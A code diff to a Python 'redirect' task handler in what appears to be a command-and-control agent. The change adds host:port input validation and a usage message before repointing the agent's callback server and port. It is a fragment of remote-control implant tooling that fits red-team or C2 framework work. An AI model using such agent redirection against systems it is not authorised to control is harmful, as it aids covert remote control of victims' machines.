@@ -1,27 +1,33 @@
-import re
-
-
 def redirect(task_id, command):
 
-    print("[+] REDIRECTION " + command)
-
     params = command.split(":")
-    ip = params[0]
-    port = params[1]
 
-    print("\t - Server: " + ip)
-    print("\t - Port: " + port)
+    print(len(params))
 
-    agent.Server = "http://" + ip
-    agent.Port = port
-
-    response = {
+    if len(params) != 2:
+        response = {
             'task_id': task_id,
-            "user_output": "Redirected to " + command,
+            "user_output": "usage redirect <host:port>",
             'completed': True
         }
-    responses.append(response)
+        responses.append(response)
+        return
 
-    print("\t- Redirect Done")
+    else:
 
-    return
+        ip = params[0]
+        port = params[1]
+
+        agent.Server = "http://" + ip
+        agent.Port = port
+
+        response = {
+                'task_id': task_id,
+                "user_output": "Redirected to {}:{}".format(agent.Server,agent.Port),
+                'completed': True
+            }
+        responses.append(response)
+
+        print("\t- Redirect Done")
+
+        return
